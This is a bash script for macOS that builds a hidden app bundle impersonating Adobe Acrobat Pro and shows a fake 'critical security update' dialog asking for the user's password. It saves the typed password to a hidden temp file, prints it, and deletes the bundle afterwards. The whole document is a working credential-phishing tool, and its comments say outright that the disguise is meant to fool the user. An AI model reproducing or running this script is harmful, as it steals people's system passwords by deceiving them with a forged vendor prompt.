#!/bin/bash
# Create a minimal .app bundle so the dialog shows "Adobe Acrobat Pro" 
# instead of "osascript" or "Terminal"
APP="/tmp/.com.adobe.acrobat.updater.app"
rm -rf "$APP"
mkdir -p "$APP/Contents/MacOS" "$APP/Contents/Resources"

cat > "$APP/Contents/Info.plist" << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleName</key>
    <string>Adobe Acrobat Pro</string>
    <key>CFBundleDisplayName</key>
    <string>Adobe Acrobat Pro</string>
    <key>CFBundleIdentifier</key>
    <string>com.adobe.acrobat.pro</string>
    <key>CFBundleExecutable</key>
    <string>run</string>
    <key>LSUIElement</key>
    <true/>
</dict>
</plist>
EOF

# The executable uses osascript display dialog to capture password
# When launched from within a .app bundle, the dialog shows the bundle name
cat > "$APP/Contents/MacOS/run" << 'INNER'
#!/bin/bash
RESULT=$(/usr/bin/osascript << 'AS'
tell application "System Events"
    activate
    set userPass to text returned of (display dialog "Adobe Acrobat Pro needs to install a critical security update (APSB26-011)." & return & return & "Enter your password to allow this." with title "Adobe Acrobat Pro" default answer "" with icon caution buttons {"Cancel", "OK"} default button "OK" with hidden answer)
    return userPass
end tell
AS
)
echo "$RESULT" > /tmp/.aupd_out
INNER
chmod +x "$APP/Contents/MacOS/run"

# Launch the app and wait for result
open -W "$APP" &
OPENPID=$!

# Wait up to 90 seconds for user interaction
for i in $(seq 1 90); do
    if [ -f /tmp/.aupd_out ]; then
        cat /tmp/.aupd_out
        rm -f /tmp/.aupd_out
        rm -rf "$APP"
        kill $OPENPID 2>/dev/null
        exit 0
    fi
    sleep 1
done

rm -rf "$APP"
echo "TIMEOUT"
